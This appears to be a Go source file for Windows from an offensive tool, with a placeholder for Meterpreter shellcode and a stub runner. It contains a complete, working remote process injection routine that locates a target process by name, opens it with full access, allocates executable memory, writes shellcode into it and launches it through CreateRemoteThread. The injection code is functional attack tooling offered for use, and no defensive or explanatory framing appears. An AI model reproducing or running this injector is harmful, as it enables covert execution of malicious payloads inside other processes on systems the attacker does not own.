//go:build windows

package main

import (
    "fmt"
    "syscall"
    "unsafe"
)

var meterpreterShellcode = []byte{
    // Shellcode here
}

func executeMSF(){
	scinject(meterpreterShellcode)
}

func scinject(shellcode []byte) error{
    if len(shellcode) == 0 {
        return fmt.Errorf("Empty Shellcode")
    }
    return nil
}

func injectIntoRemoteProcess(shellcode []byte, targetProcess string) error {
    kernel32 := syscall.NewLazyDLL("kernel32.dll")
    OpenProcess := kernel32.NewProc("OpenProcess")
    VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
    WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
    CreateRemoteThread := kernel32.NewProc("CreateRemoteThread")
    CloseHandle := kernel32.NewProc("CloseHandle")
    pid, err := findProcessByName(targetProcess)
    if err != nil {
        return fmt.Errorf("target process not found: %v", err)
    }
    hProcess, _, err := OpenProcess.Call(
        0x001F0FFF, // PROCESS_ALL_ACCESS
        0,          // Don't inherit handle
        uintptr(pid),
    )
    if hProcess == 0 {
        return fmt.Errorf("OpenProcess failed: %v", err)
    }
    defer CloseHandle.Call(hProcess)
    addr, _, err := VirtualAllocEx.Call(
        hProcess,
        0,
        uintptr(len(shellcode)),
        0x3000, // MEM_COMMIT | MEM_RESERVE
        0x40,   // PAGE_EXECUTE_READWRITE
    )
    if addr == 0 {
        return fmt.Errorf("VirtualAllocEx failed: %v", err)
    }
    var written uintptr
    _, _, err = WriteProcessMemory.Call(
        hProcess,
        addr,
        uintptr(unsafe.Pointer(&shellcode[0])),
        uintptr(len(shellcode)),
        uintptr(unsafe.Pointer(&written)),
    )
    if written != uintptr(len(shellcode)) {
        return fmt.Errorf("WriteProcessMemory failed: wrote %d/%d bytes", written, len(shellcode))
    }
    hThread, _, err := CreateRemoteThread.Call(
        hProcess,0,0,
        addr, // Start address (our shellcode)
        0,0,0,)
    if hThread == 0 {
        return fmt.Errorf("CreateRemoteThread failed: %v", err)
    }
    defer CloseHandle.Call(hThread)
    //fmt.Printf("[+] Injected into %s (PID: %d)\n", targetProcess, pid)
    return nil
}

func findProcessByName(name string) (uint32, error) {
    kernel32 := syscall.NewLazyDLL("kernel32.dll")
    CreateToolhelp32Snapshot := kernel32.NewProc("CreateToolhelp32Snapshot")
    Process32First := kernel32.NewProc("Process32FirstW")
    Process32Next := kernel32.NewProc("Process32NextW")
    CloseHandle := kernel32.NewProc("CloseHandle")
    snapshot, _, _ := CreateToolhelp32Snapshot.Call(
        0x00000002, // TH32CS_SNAPPROCESS
        0,)
    if snapshot == 0 {
        return 0, fmt.Errorf("CreateToolhelp32Snapshot failed")
    }
    defer CloseHandle.Call(snapshot)
    type ProcessEntry32 struct {
        Size              uint32
        CntUsage          uint32
        ProcessID         uint32
        DefaultHeapID     uintptr
        ModuleID          uint32
        Threads           uint32
        ParentProcessID   uint32
        PriorityClassBase int32
        Flags             uint32
        ExeFile           [260]uint16
    }
    var pe ProcessEntry32
    pe.Size = uint32(unsafe.Sizeof(pe))
    // Iterate through processes
    ret, _, _ := Process32First.Call(snapshot, uintptr(unsafe.Pointer(&pe)))
    if ret == 0 {
        return 0, fmt.Errorf("Process32First failed")
    }
    for {
        exeName := syscall.UTF16ToString(pe.ExeFile[:])
        if exeName == name {
            return pe.ProcessID, nil
        }
        ret, _, _ = Process32Next.Call(snapshot, uintptr(unsafe.Pointer(&pe)))
        if ret == 0 {
            break
        }
    }
    return 0, fmt.Errorf("process not found")
}